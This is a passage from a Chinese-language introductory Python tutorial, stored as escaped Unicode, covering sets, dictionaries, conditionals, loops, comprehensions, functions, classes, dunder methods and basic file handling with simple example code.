\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694\uff0c\u4f1a\u81ea\u52a8\u53bb\u91cd \u53ef\u7528 set(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\u8f6c\u4e3a\u5143\u7ec4\uff0c\u81ea\u52a8\u53bb\u91cd \u96c6\u5408\u4e2d\u4e0d\u80fd\u5305\u542b\u5217\u8868\u7b49\u4e0d\u53ef hash \u5316\u7684\u5143\u7d20 \u4fee\u6539 s.add(...) \u6765\u52a0\u5165\u4e00\u4e2a\u5143\u7d20 s.remove(...) \u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u4f1a\u629b\u51fa\u5f02\u5e38 s.discard(...) \u6765\u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u5219\u5ffd\u7565 \u8fd0\u7b97 s1 & s2\u3001s1 | s2\u3001s1 - s2 \u4ea4\u96c6\u3001\u5e76\u96c6\u3001\u5dee\u96c6 s1 ^ s2 \u5bf9\u79f0\u5dee\u96c6 \u5b57\u5178 \u00b6 \u5b58\u50a8\u952e\u503c\u5bf9\uff0c\u4e5f\u662f\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u4e0d\u8fc7\u9017\u53f7\u5206\u9694\u7684\u662f\u952e\u503c\u5bf9 {key: value, ...} {} \u662f\u7a7a\u5b57\u5178\u800c\u4e0d\u662f\u7a7a\u96c6\u5408 \u901a\u8fc7 d[key] \u6765\u8bbf\u95ee\u5b57\u5178\u4e2d key \u5bf9\u5e94\u7684\u503c\uff0c\u53ef\u4ee5\u8bfb\u53d6\u3001\u4fee\u6539 \u6dfb\u52a0\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 d[key] = value \u6765\u8fdb\u884c \u5220\u9664\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5 del d[key] \u901a\u8fc7 d[key] \u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728 key \u8fd9\u4e2a\u952e\u4f1a\u629b\u51fa\u5f02\u5e38 \u901a\u8fc7 d.get(key) \u6765\u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728\u5219\u4f1a\u8fd4\u56de None \u4f7f\u7528 d.get(key, default) \u5982\u679c\u6ca1\u6709 key \u65f6\u4f1a\u8fd4\u56de default \u503c d.update(d2) \u6765\u7528 d2 \u4e2d\u7684\u952e\u503c\u5bf9\u66f4\u65b0 d \u6761\u4ef6\u5206\u652f \u00b6 \u5e03\u5c14\u8868\u8fbe\u5f0f \u00b6 == \u5224\u65ad\u76f8\u7b49\uff08\u76f8\u7b49\u5219\u8fd4\u56de True\uff09\uff0c != \u5224\u65ad\u4e0d\u7b49 \u4f7f\u7528 and or not \u6765\u8fdb\u884c\u5e03\u5c14\u8fd0\u7b97\uff0c\u5fc5\u8981\u65f6\u52a0\u62ec\u53f7\u4fdd\u8bc1\u4f18\u5148\u7ea7 \u6570\u503c\u6bd4\u8f83\u5927\u5c0f < <= > >= \u5224\u65ad\u5143\u7d20\u662f\u5426\u5728\u5217\u8868\u4e2d value in lst\uff1a\u5982\u679c\u5728\u5219\u503c\u4e3a True value not in lst\uff1a\u5982\u679c\u5728\u5219\u4e3a False\uff08\u5224\u65ad\u662f\u5426\u4e0d\u5728\uff09 \u5224\u65ad\u952e\u662f\u5426\u5728\u5b57\u5178\u4e2d key in d\u3001key not in d \u4e0e\u5217\u8868\u540c\u7406 \u6761\u4ef6\u8bed\u53e5 \u00b6 if-elif-else \u7ed3\u6784\uff08\u4e0d\u662f else if\uff09 elif\u3001else \u5747\u53ef\u4ee5\u7701\u7565 \u6761\u4ef6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7\uff08\u52a0\u4e86\u4e5f\u6ca1\u95ee\u9898\uff09 condition \u4f1a\u88ab\u8f6c\u6362\u6210 bool \u7c7b\u578b\u7136\u540e\u5224\u65ad \u6ce8\u610f\u7f29\u8fdb \u7c7b\u4e09\u76ee\u8fd0\u7b97\u7b26\u5199\u6cd5 a if condition else b \u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u4e2d\u7684 condition? a : b if condition1 : ... elif condition2 : ... elif condition3 : ... else : ... \u7f29\u8fdb \u00b6 \u7f29\u8fdb\u662f python \u4e2d\u5f88\u91cd\u8981\u7684\u4e1c\u897f\uff0cpython \u9760\u7f29\u8fdb\u6765\u5f97\u5230\u4ee3\u7801\u7ed3\u6784\uff0c\u800c\u4e0d\u662f\u5927\u62ec\u53f7 \u7f29\u8fdb\u53ef\u4ee5\u4f7f\u7528\u7a7a\u683c\u6216\u5236\u8868\u7b26 \u5982\u679c\u4e00\u4e9b\u4ee3\u7801\u5904\u4e8e\u540c\u4e00\u5c42\u7f29\u8fdb\u4e0b\uff0c\u5219\u5c5e\u4e8e\u540c\u4e00\u4e2a\u4ee3\u7801\u5757 \u540c\u4e00\u4e2a\u4ee3\u7801\u5757\u7684\u7f29\u8fdb\u8981\u7edf\u4e00 \u4e0d\u4ec5\u4ec5\u662f\u770b\u7740\u50cf\uff0c\u8981\u533a\u5206\u597d\u7a7a\u683c\u4e0e\u5236\u8868\u7b26 4 \u4e2a\u7a7a\u683c\u4e0e\u4e00\u4e2a\u663e\u793a\u5bbd\u5ea6\u4e3a 4 \u7684\u5236\u8868\u7b26\u5e76\u4e0d\u662f\u540c\u4e00\u7f29\u8fdb \u4e00\u822c\u4f7f\u7528 4 \u7a7a\u683c\u7f29\u8fdb\uff0c\u6216\u8005 1 \u5236\u8868\u7b26\u7f29\u8fdb \u7f16\u8f91\u5668\u4e2d\u6309 Tab \u6253\u51fa\u7684\u4e5f\u4e0d\u4e00\u5b9a\u662f\u5236\u8868\u7b26\uff0c\u8981\u5206\u6e05 \u7f29\u8fdb\u4e0d\u6b63\u786e\u4f1a\u62a5 IndentationError\uff0c\u6b64\u65f6\u6ce8\u610f\u68c0\u67e5\u7f29\u8fdb \u5faa\u73af \u00b6 for \u5faa\u73af \u00b6 python \u4e2d\u7684 for \u5faa\u73af\u5e76\u4e0d\u50cf c \u4e2d\u662f\u6307\u5b9a\u4e00\u4e2a\u53d8\u91cf\u7684\u53d8\u5316\u65b9\u5f0f\uff0c\u800c\u662f\u4ece\u5217\u8868/\u5143\u7ec4/\u8fed\u4ee3\u5668\u7b49\u53ef\u8fed\u4ee3\u5bf9\u8c61\u4e2d\u904d\u5386\u503c for \u5faa\u73af\u4f1a\u4ea7\u751f\u4e00\u4e2a\u7528\u4e8e\u5faa\u73af\u7684\u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u5728\u5faa\u73af\u7ed3\u675f\u540e\u5e76\u4e0d\u4f1a\u5220\u9664\uff0c\u800c\u662f\u4fdd\u7559\u6700\u540e\u4e00\u6b21\u7684\u503c \u53ef\u4ee5\u4f7f\u7528 range \u6765\u751f\u6210\u4e00\u4e32\u6570\u5b57\u7528\u6765\u5faa\u73af range(a, b) \u751f\u6210\u4ece a \u5230 b-1 \u7684\u8fde\u7eed\u6574\u6570 range(a, b, c) \u4ee5 c \u4e3a\u6b65\u957f\u751f\u6210 range \u5f97\u5230\u7684\u5e76\u4e0d\u662f\u5217\u8868\uff0c\u5982\u679c\u8981\u7528\u5176\u751f\u6210\u5217\u8868\u8981\u4f7f\u7528 list(range(...)) for value in lst : ... for value in range ( ... ): ... for \u5faa\u73af\u904d\u5386\u5b57\u5178 \u00b6 \u6709\u4e09\u79cd\u65b9\u6cd5\u6765\u904d\u5386\u5b57\u5178 \u5728 d.keys() \u4e2d\u5faa\u73af\u904d\u5386\u6240\u6709\u952e \u5728 d.values() \u4e2d\u5faa\u73af\u904d\u5386\u6240\u6709\u503c \u5728 d.items() \u4e2d\u904d\u5386\u952e\u503c\u5bf9\uff08\u9700\u8981\u89e3\u5305\uff09 for key in d . keys (): ... for value in d . values (): ... for item in d . items (): ... # item \u4e3a\u4e00\u4e2a\u5143\u7ec4 for key , value in d . items (): ... # \u5c06 item \u89e3\u5305 \u5143\u7d20\u89e3\u5305 \u00b6 \u8d4b\u503c\u65f6\u7b49\u53f7\u5de6\u4fa7\u53ef\u4ee5\u662f\u7528\u9017\u53f7\u5206\u9694\u7684\u591a\u4e2a\u503c\uff0c\u8fd9\u65f6\u4f1a\u5c06\u53f3\u4fa7\u89e3\u5305\u5206\u522b\u8d4b\u503c\u7ed9\u5de6\u4fa7\u7684\u5404\u4e2a\u53d8\u91cf \u53f3\u4fa7\u4e5f\u53ef\u4ee5\u662f\u591a\u4e2a\u503c\uff08\u53ea\u8981\u51fa\u73b0\u9017\u53f7\u5c31\u4f1a\u89c6\u4e3a\u4e00\u4e2a\u5143\u7ec4\uff09 \u53ef\u4ee5\u901a\u8fc7 a, b = b, a \u5b9e\u73b0\u5143\u7d20\u4ea4\u6362 \u661f\u53f7\u8868\u8fbe\u5f0f \u53ef\u4ee5\u7528\u6765\u5728\u53ef\u8fed\u4ee3\u5bf9\u8c61\u5185\u90e8\u89e3\u5305 \u4e5f\u53ef\u7528\u6765\u6807\u8bb0\u4e00\u4e2a\u53d8\u91cf\u5305\u542b\u591a\u4e2a\u503c for \u5faa\u73af\u53ef\u4ee5\u89e3\u5305 t = ( 1 , 2 , 3 ) a , b , c = t # a = 1, b = 2, c = 3 t = ( 1 , 2 , ( 3 , 4 )) a , b , ( c , d ) = t # c = 3, d = 4 l = [ 1 , 2 , * [ 3 , 4 ]] # [3, 4] \u88ab\u89e3\u5305 ## l = [1, 2, 3, 4] a , * b = [ 1 , 2 , 3 , 4 ] ## a = 1, b = [2, 3, 4] lst = [[ 1 , 2 ], [ 3 , 4 ]] for a , b in lst : ... # \u7b2c\u4e00\u6b21\u5faa\u73af a, b \u4e3a 1, 2 # \u7b2c\u4e8c\u6b21\u5faa\u73af a, b \u4e3a 3, 4 for \u5faa\u73af\u6280\u5de7 \u00b6 enumerate \u8ba1\u6570 \u53ef\u4ee5\u6307\u5b9a\u521d\u59cb\u503c zip \u540c\u65f6\u5faa\u73af\u591a\u4e2a\u53ef\u8fed\u4ee3\u5bf9\u8c61 \u5faa\u73af\u6b21\u6570\u4e3a\u6700\u77ed\u7684\u5bf9\u8c61\u7684\u957f\u5ea6 for i , value in enumerate ( lst ): ... # i \u4f9d\u6b21\u4e3a 0\uff0c1\uff0c2\uff0c\u2026\u2026 for i , value in enumerate ( lst , 1 ): ... # i \u4f9d\u6b21\u4e3a 1\uff0c2\uff0c3\uff0c\u2026\u2026 for a , b in zip ( lst1 , lst2 ): ... # a \u5728 lst1 \u4e2d\u5faa\u73af # b \u5728 lst2 \u4e2d\u5faa\u73af \u5217\u8868\u63a8\u5bfc \u00b6 \u4e00\u79cd\u5f88\u65b9\u4fbf\u7684\u751f\u6210\u5217\u8868\u7684\u65b9\u5f0f \u5373\u5728\u5217\u8868\u4e2d\u5305\u542b\u5faa\u73af\uff0c\u9010\u6b21\u8bb0\u5f55\u5faa\u73af\u524d\u8868\u8fbe\u5f0f\u7684\u503c \u53ef\u4ee5\u6709\u591a\u91cd\u5faa\u73af\uff0c\u5373\u751f\u6210\u7b1b\u5361\u5c14\u79ef \u53ef\u4ee5\u5305\u542b\u6761\u4ef6\uff0c\u5373\u5728\u6761\u4ef6\u6210\u7acb\u65f6\u624d\u8bb0\u5f55\u503c \u5217\u8868\u63a8\u5bfc\u4e2d\u7684\u5faa\u73af\u53d8\u91cf\u6709\u5c40\u90e8\u4f5c\u7528\u57df \u5373\u5728\u5217\u8868\u63a8\u5bfc\u5916\u4e0d\u80fd\u8bbf\u95ee\u5faa\u73af\u53d8\u91cf lst = [] for i in range ( 1 , 10 ): lst . append ( i ** 2 ) ## \u7b49\u4ef7\u4e8e lst = [ i ** 2 for i in range ( 1 , 10 )] lst1 = [ x * y for x in l1 for y in l2 ] lst2 = [ ... for ... in ... if ... ] \u751f\u6210\u5143\u7ec4/\u5b57\u5178 \u00b6 \u53ef\u4ee5\u4f7f\u7528\u548c\u5217\u8868\u63a8\u5bfc\u7c7b\u4f3c\u7684\u65b9\u6cd5\u751f\u6210\u5143\u7ec4\u548c\u5b57\u5178 \u751f\u6210\u5143\u7ec4\u7684\u65f6\u5019\u8981\u7528 tuple() \u53ea\u5199 () \u7684\u8bdd\u5219\u53ea\u662f\u751f\u6210\u5668\u8868\u8fbe\u5f0f \u751f\u6210\u5b57\u5178\u65f6\u5faa\u73af\u524d\u7528 : \u5c06\u952e\u503c\u9694\u5f00 tuple ( i ** 2 for i in range ( 1 , 10 )) ( i ** 2 for i in range ( 1 , 10 )) ## ^ generator object { a : b for a in ... for b in ... } \u63a7\u5236\u5faa\u73af \u00b6 \u548c\u5176\u5b83\u8bed\u8a00\u4e00\u6837\uff0c\u5728\u5faa\u73af\u4ee3\u7801\u5757\u4e2d\u53ef\u4ee5\u63a7\u5236\u5faa\u73af\u7684\u8fdb\u884c break \u7acb\u523b\u7ed3\u675f\u5faa\u73af continue \u7acb\u523b\u8fdb\u884c\u4e0b\u4e00\u8f6e\u5faa\u73af while \u5faa\u73af \u00b6 while \u5faa\u73af\u5373\u8fdb\u884c\u6761\u4ef6\u68c0\u67e5\uff0c\u5982\u679c\u4e3a True \u5219\u7ee7\u7eed\u8fd0\u884c\u76f4\u5230\u6761\u4ef6\u4e0d\u6ee1\u8db3\u505c\u6b62 while condition : ... \u51fd\u6570 \u00b6 \u51fd\u6570\u5b9a\u4e49 \u00b6 \u4f7f\u7528 def \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u51fd\u6570 \u5148\u51fd\u6570\u540d\uff0c\u7136\u540e\u62ec\u53f7\u5217\u51fa\u53c2\u6570\uff0c\u4e0b\u9762\u63a5\u4ee3\u7801\u5757 \u4f7f\u7528 return \u8fd4\u56de \u6ca1\u6709 return \u8fd0\u884c\u5230\u7ed3\u5c3e\uff0c\u8fd4\u56de None \u53ea\u6709 return\uff0c\u8fd4\u56de None return \u540e\u63a5\u5185\u5bb9\uff0c\u8fd4\u56de\u5185\u5bb9 return \u7684\u503c\u7c7b\u578b\u4e0d\u8981\u6c42\u4e00\u81f4 return \u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c\uff08\u5229\u7528\u5143\u7ec4\uff09 def func_name ( arg1 , arg2 ): ... def func_name ( arg1 , arg2 ): ... return ... def func_name ( arg1 , arg2 ): ... return ... , ... \u51fd\u6570\u53c2\u6570 \u00b6 \u62ec\u53f7\u4e2d\u8981\u5217\u51fa\u53c2\u6570\u540d\uff0c\u4f9b\u51fd\u6570\u4f53\u5185\u4f7f\u7528 \u53ef\u4ee5\u5728\u53c2\u6570\u540e\u63a5\u7b49\u53f7\u8d4b\u9ed8\u8ba4\u503c \u4f7f\u7528\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5728\u8c03\u7528\u65f6\u53ef\u4ee5\u4e0d\u7528\u4f20 \u5229\u7528 * \u6765\u63a5\u6536\u4efb\u610f\u591a\u53c2\u6570 \u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5143\u7ec4 * \u53c2\u6570\u540e\u9762\u4e0d\u80fd\u518d\u6709\u5176\u5b83\u975e\u5173\u952e\u5b57\u53c2\u6570 \u5229\u7528 ** \u6765\u63a5\u6536\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570 \u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5b57\u5178 def func ( arg1 , arg2 ): ... def func ( arg1 , arg2 = \"...\" ): # \u9ed8\u8ba4\u503c ... def func ( arg1 , * arg2 ): # \u4efb\u610f\u591a\u53c2\u6570 ... def func ( arg1 , ** arg2 ): # \u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570 ... def func ( arg1 , * arg2 , ** arg3 ): ... # *arg2 \u540e\u53ef\u4ee5\u52a0 **arg3 \u51fd\u6570\u8c03\u7528 \u00b6 \u901a\u8fc7 \u51fd\u6570\u540d(\u53c2\u6570) \u6765\u8c03\u7528\u51fd\u6570\uff0c\u5f97\u5230\u8fd4\u56de\u503c \u76f4\u63a5\u4f20\u53c2\u7684\u8bdd\u8981\u5c06\u53c2\u6570\u4e0e\u5b9a\u4e49\u5bf9\u5e94\u4e0a \u901a\u8fc7\u5173\u952e\u5b57\u4f20\u53c2\uff08\u53c2\u6570\u540d\uff09\u53ef\u4ee5\u6253\u4e71\u987a\u5e8f \u5e26\u6709\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5982\u679c\u4e0d\u4f20\u5219\u4f7f\u7528\u9ed8\u8ba4\u503c \u5982\u679c\u8bfb\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570\uff0c\u5219\u591a\u4f59\u7684\u8bfb\u5230\u5b57\u5178\u4e2d def func ( a , b ): ... func ( 1 , 2 ) # a = 1, b = 2 func ( b = 1 , a = 2 ) # a = 2, b = 1 def func2 ( a , ** b ): ... func2 ( a = 1 , b = 2 , c = 3 ) ## a = 1, b = {\"b\": 2, \"c\": 3} *\u5f15\u7528\u53d8\u91cf \u00b6 python \u4e2d\u7684\u53d8\u91cf\u90fd\u662f\u5f15\u7528\u7684\uff08\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4ec0\u4e48\u524d\u9762\u8bf4\u4e0d\u8981\u5c06\u53d8\u91cf\u7406\u89e3\u4e3a\u76d2\u5b50\uff09 \u7528 = \u5b9e\u9645\u4e0a\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u522b\u540d lst1 = lst2\uff0c\u5219 lst1 \u548c lst2 \u4f1a\u540c\u65f6\u53d8\u5316\uff08\u8981\u7528 [:] \u521b\u5efa\u526f\u672c\uff09 \u6570\u503c\u7c7b\u578b\u6709\u4f18\u5316\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8fd9\u6837 == \u68c0\u67e5\u503c\u662f\u5426\u76f8\u7b49\uff0cis \u68c0\u67e5\u503c\u662f\u5426\u76f8\u540c \u89c2\u5bdf pythontutor.com \u51fd\u6570\u53c2\u6570\u4f20\u9012\u53ea\u6709\u201c\u5171\u4eab\u4f20\u53c2\u201d\u4e00\u79cd\u5f62\u5f0f\uff08\u5373\u4f20\u5f15\u7528\uff09 \u53ef\u53d8\u53d8\u91cf\uff08\u4f8b\u5982\u5217\u8868\uff09\u5728\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u88ab\u6539\u53d8 \u907f\u514d\u5411\u51fd\u6570\u4f20\u9012\u53ef\u53d8\u53d8\u91cf\uff08\u5217\u8868\u53ef\u4f20\u5165 [:] \u521b\u5efa\u7684\u526f\u672c\uff09 \u533f\u540d\u51fd\u6570 \u00b6 \u53ef\u4ee5\u901a\u8fc7 lambda \u8868\u8fbe\u5f0f\u6765\u5b9a\u4e49\u533f\u540d\u51fd\u6570 lambda \u8f93\u5165: \u8f93\u51fa\u8868\u8fbe\u5f0f \u53ef\u4ee5\u6709\u591a\u4e2a\u8f93\u5165 \u53ef\u4ee5\u5c06\u4e00\u4e2a\u51fd\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf \u907f\u514d\u7528 lambda \u8d4b\u503c\u7684\u5f62\u5f0f\u5b9a\u4e49\u51fd\u6570 \u4f8b\u5982 __name__ \u5c5e\u6027\u4e0d\u4f1a\u662f\u51fd\u6570\u540d\uff0c\u800c\u662f \"\\<lambda>\" lambda a : a ** 2 + 2 * a + 1 ( lambda a : a ** 2 + 2 * a + 1 )( 2 ) # 9 lambda a , b : a * 2 + b f = lambda a : a ** 2 + 2 * a + 1 ## \u8fd1\u4f3c\u7b49\u4ef7\u4e8e def f ( a ): return a ** 2 + 2 * a + 1 \u7528\u6237\u8f93\u5165 \u00b6 \u8bfb\u53d6\u7528\u6237\u8f93\u5165\u4f7f\u7528\u5185\u7f6e\u7684 input \u51fd\u6570 \u51fd\u6570\u53c2\u6570\u4e3a\u8981\u663e\u793a\u7684\u63d0\u793a\u7b26\uff0c\u4f8b\u5982 input(\"> \") \u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u6bcf\u6b21\u8bfb\u5165\u4e00\u884c\uff08\u5373\u8bfb\u5230\u6362\u884c\u4e3a\u6b62\uff09 \u9ad8\u9636\u51fd\u6570\u7528\u6cd5 \u00b6 \u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u7684\u51fd\u6570\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570 \u6bd4\u8f83\u5e38\u7528\u7684\u6709 map\u3001filter list ( map ( lambda x : x * 2 , [ 1 , 2 ])) ## [2, 4] list ( filter ( lambda x : x > 1 , [ 1 , 2 , 3 ])) ## [2, 3] \u7c7b\u4e0e\u9762\u5411\u5bf9\u8c61 \u00b6 \u7c7b \u00b6 \u7c7b\u53ef\u4ee5\u770b\u6210\u5305\u542b\u4e00\u4e9b \u5c5e\u6027 \u548c \u65b9\u6cd5 \u7684\u6846\u67b6 \u6839\u636e\u7c7b\u6765\u521b\u5efa\u5bf9\u8c61 -> \u5b9e\u4f8b\u5316 \u7528 class \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u7c7b \u7c7b\u4e2d\u7684\u51fd\u6570 -> \u65b9\u6cd5 \u7279\u6b8a\u65b9\u6cd5 __init__\uff0c\u5728\u7c7b\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528 \u5176\u5b83\u4e00\u822c\u7684\u65b9\u6cd5\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u8981\u4e3a\"self\"\uff0c\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u4f20\u5165 \u76f4\u63a5\u5199\u5728\u7c7b\u4e2d\u7684\u662f\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e3a self.\\<name> \u8d4b\u503c\u7684\u5f62\u5f0f\u521b\u5efa\u5c5e\u6027 \u7528\u7c7b\u4f3c\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u5b9e\u4f8b\u5316\u7c7b\uff0c\u53c2\u6570\u4e3a__init__\u65b9\u6cd5\u7684\u53c2\u6570 \u76f4\u63a5\u901a\u8fc7 .\\<method> .\\<attribute> \u7684\u5f62\u5f0f\u8c03\u7528\u65b9\u6cd5/\u83b7\u53d6\u5c5e\u6027 class ClassName (): a = 1 def __init__ ( self , arg1 , arg2 ): self . arg1 = arg1 self . arg2 = arg2 def method ( self ): print ( self . arg1 , self . arg2 , self . a ) obj = ClassName ( 2 , 3 ) obj . method () # 2 3 1 print ( obj . a , obj . arg1 ) # 1 2 \u7c7b\u7684\u7ee7\u627f \u00b6 \u5728 class \u5b9a\u4e49\u7684\u62ec\u53f7\u4e2d\u52a0\u4e0a\u53e6\u4e00\u4e2a\u7c7b\u540d\u5219\u8868\u793a\u7ee7\u627f\u81ea\u90a3\u4e2a\u7c7b\u5b9a\u4e49\u4e00\u4e2a\u5b50\u7c7b \u5b50\u7c7b\u4f1a\u7ee7\u627f\u7236\u7c7b\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5 \u5b50\u7c7b\u7f16\u5199\u548c\u7236\u7c7b\u540d\u5b57\u4e00\u6837\u7684\u65b9\u6cd5\u4f1a \u91cd\u8f7d \u5728\u91cd\u8f7d\u7684\u65b9\u6cd5\u4e2d\u8c03\u7528\u7236\u7c7b\u7684\u539f\u65b9\u6cd5\u4f7f\u7528 super() \u4e5f\u53ef\u4ee5\u4e3a\u5b50\u7c7b\u5b9a\u4e49\u72ec\u6709\u7684\u65b9\u6cd5 class ClassA (): def __init__ ( self , a ): self . a = a def print ( self ): print ( self . a ) class ClassB ( ClassA ): def __init__ ( self , a ): super () . __init__ ( a ) self . a *= 2 obj = ClassB ( 1 ) obj . print () # 2 \u79c1\u6709\uff1f \u00b6 python \u4e2d\u7c7b\u5e76\u6ca1\u6709\u4e25\u683c\u79c1\u6709\u7684\u5c5e\u6027 \u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u5c5e\u6027\u4f1a\u88ab\u9690\u85cf\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bfb\u53d6 \u4f46\u8fd9\u79cd\u5c5e\u6027\u53ef\u4ee5\u901a\u8fc7 _\u7c7b\u540d__\u5c5e\u6027 \u4f46\u65b9\u5f0f\u8bfb\u53d6\u5230 \u4f7f\u7528\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u5c5e\u6027\u53ef\u4ee5\u8f7b\u5fae\u4fdd\u62a4\u5c5e\u6027\uff0c\u4f46\u5e76\u4e0d\u4ee3\u8868\u5176\u662f\u79c1\u6709\u7684 class A (): a = 1 _a = 2 __a = 3 obj = A () print ( obj . a ) # 1 print ( obj . _a ) # 2 print ( obj . __a ) # AttributeError print ( obj . _A__a ) # 3 \u4e00\u5207\u7686\u5bf9\u8c61\uff1f \u00b6 python \u4e2d\u5373\u4f7f\u6700\u7b80\u5355\u7684\u6574\u6570\u4e5f\u662f\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b \u901a\u8fc7 dir(...) \u67e5\u770b\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027/\u65b9\u6cd5 \u6709\u5f88\u591a\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u3001\u53cc\u4e0b\u5212\u7ebf\u7ed3\u5c3e\u7684\u65b9\u6cd5\uff0c\u6210\u4e3a\u9b54\u672f\u65b9\u6cd5\uff08dunder method\uff09 \u9b54\u672f\u65b9\u6cd5 \u00b6 \u5f88\u591a\u51fd\u6570\u3001\u8868\u8fbe\u5f0f\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528\u7c7b\u7684\u9b54\u672f\u65b9\u6cd5\u6765\u5b9e\u73b0\u7684 len(obj) \u8c03\u7528 obj.__len__() obj[...] \u8c03\u7528 obj.__getitem__(...) a in obj \u8c03\u7528 obj.__contains__(a) bool(obj) \u8c03\u7528 obj.__bool__() \u51fd\u6570\u7684\u8c03\u7528\u672c\u8d28\u4e0a\u662f\u8c03\u7528 func.__call__() a + b \u8c03\u7528 a.__add__(b) \u2026\u2026 \u4e00\u4e2a\u4f8b\u5b50\uff1a lst[a:b:c] \u5207\u7247\u64cd\u4f5c \u5176\u4e2d\u5207\u7247\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u662f\u4e00\u4e2a slice \u7c7b\u7684\u5b9e\u4f8b \u6240\u4ee5\u5b83\u7b49\u4ef7\u4e8e lst[slice(a, b, c)] \u800c\u901a\u8fc7 [] \u7684\u64cd\u4f5c\u53c8\u662f\u901a\u8fc7 __getitem__ \u9b54\u672f\u65b9\u6cd5\u5b9e\u73b0\u7684 \u6240\u4ee5\u5b83\u53c8\u7b49\u4ef7\u4e8e lst.__getitem__(slice(a, b, c)) __getitem__ \u65b9\u6cd5\u4e2d\u5904\u7406\u4e86 slice\uff0c\u8bfb\u53d6 abc \u7684\u503c\uff0c\u518d\u5904\u7406\u8fd4\u56de\u4e00\u4e2a\u65b0\u5217\u8868 \u6742\u9879\u5185\u5bb9 \u00b6 \u6587\u4ef6\u64cd\u4f5c \u00b6 open \u51fd\u6570\uff0c\u4f20\u5165\u6587\u4ef6\u540d\u3001\u6253\u5f00\u6a21\u5f0f \u6253\u5f00\u6a21\u5f0f\uff08\u53ef\u4ee5\u53e0\u52a0\uff09\uff1ar \u8bfb\uff08\u9ed8\u8ba4\uff09\u3001w \u5199\u3001x \u521b\u5efa\u5e76\u5199\u3001a \u5199\u5728\u672b\u5c3e\u3001b \u5b57\u8282\u6a21\u5f0f\u3001t \u6587\u672c\u6a21\u5f0f\uff08\u9ed8\u8ba4\uff09 \u8bfb\u53d6 \u6587\u672c\u6a21\u5f0f\u5efa\u8bae\u52a0\u4e0a encoding\uff0c\u4e0d\u7136\u5bb9\u6613\u62a5\u9519 f.read() \u8bfb\u53d6\u5168\u90e8\u5185\u5bb9\uff08\u5b57\u8282\u6a21\u5f0f\u5f97\u5230\u5b57\u8282\u5e8f\u5217\uff09 f.readline() \u8bfb\u53d6\u4e00\u884c f.readlines() \u8bfb\u53d6\u6240\u6709\u884c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868 \u5199\u5165 \u6587\u672c\u6a21\u5f0f\u540c\u6837\u5efa\u8bae\u52a0\u4e0a encoding f.write(...) \u76f4\u63a5\u5199\u5165 f.writelines(...) \u4f20\u5165\u5217\u8868\uff0c\u5143\u7d20\u95f4\u6362\u884c\u5199\u5165 \u901a\u8fc7\u8fd9\u79cd\u5f62\u5f0f\u64cd\u4f5c\u6587\u4ef6\u8bb0\u5f97\u7528\u5b8c\u540e\u8981 f.close() f = open ( \"filename\" , \"r\" , encoding = \"utf-8\" ) s = f . read () # a str ## line = f.readline() # a str ## lines = f.readlines() # a list ... f . close () f = open ( \"filename\" , \"w\" , encodeing = \"utf-8\" ) f . write ( \"...\" ) f . writelines ([ \"...\" , \"...\" ]) ... f . close () with \u5757 \u00b6 with ... as ...: \u5f00\u542f\u4e00\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668 \u5e38\u7528\u5728\u6587\u4ef6 open \u4e0a with \u5757\u5f00\u59cb\u81ea\u52a8\u6253\u5f00 with \u5757\u7ed3\u675f\u81ea\u52a8\u7ed3\u675f with \u5757\u7ed3\u675f\u540e\u53d8\u91cf\u4ecd\u4f1a\u7559\u5b58 with open ( \"file\" , \"r\" , encoding = \"utf-8\" ) as f : 